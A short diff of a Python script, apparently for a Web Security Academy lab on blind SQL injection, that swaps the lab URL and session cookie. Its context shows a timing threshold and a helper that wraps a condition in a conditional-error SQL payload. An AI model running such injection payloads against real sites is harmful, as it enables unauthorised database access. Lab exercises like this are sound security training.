@@ -14,10 +14,9 @@ max_workers = 4
 # Umbral a mitad de camino entre ~0s (condicion falsa) y ~10s (condicion
 # verdadera): robusto frente al jitter en ambas direcciones.
 
-url = "https://0a5b00d60374f289801bda40002300cd.web-security-academy.net:443/"
+url = "https://0a9300e4037761d480b0eed900f0009b.web-security-academy.net:443/"
 headers = {"Accept-Language": "es-ES,es;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Sec-Ch-Ua": "\"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Referer": "https://0a0a000804382a678088084a007c00cd.web-security-academy.net/", "Accept-Encoding": "gzip, deflate, br", "Priority": "u=0, i"}
-session = "rQCQGYoU5sY6WkfpHSVHsUeFLFfmZPsn"
-
+session = "klaTxobbEMMeQS9tzVlfyOipMedknkKS"
 
 def add_conditional_error_if_sql_query_is_working(query_sql: str) -> str:
     return f"SELECT CASE WHEN {query_sql} THEN 1/(SELECT 0) ELSE NULL END--"
